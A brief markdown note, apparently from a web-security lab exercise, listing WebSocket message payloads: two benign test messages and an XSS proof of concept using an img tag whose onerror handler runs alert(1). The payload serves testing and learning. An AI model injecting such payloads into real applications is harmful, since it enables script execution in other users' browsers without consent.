# WebSocket Message Payloads

```text
Hello
```

```json
{"message":"Hello Carlos"}
```

XSS proof of concept:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```
